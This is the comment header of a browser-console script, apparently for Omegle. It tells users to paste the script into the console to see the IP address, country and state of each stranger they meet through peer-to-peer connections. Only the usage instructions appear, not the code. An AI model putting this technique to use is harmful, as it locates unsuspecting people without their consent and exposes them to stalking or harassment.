//Insert your API to "your-api-key-here"
//API key from https://ipgeolocation.io/

//How to run the code
//1. press ctrl+shift+I
//2. paste the command to console
//3. everytime someone joins you one omegle you can see their IP adress, country, state where they live in.

//How does this work?
//Its P2P meaning everytime you join someone you connect to the person and not server. This leaves you and the person who you connected to volunereable.
//You can avoid this by simply just running VPN(Virtual Private Network), but omegle has blocked most of the major vpns so you will have to make your own or you will have to
//run some from small company. This code can be used on other P2P streaming services. Enjoy!

//If the code doesnt work make sure you replaced the "your-api-key-here" section with your api key.
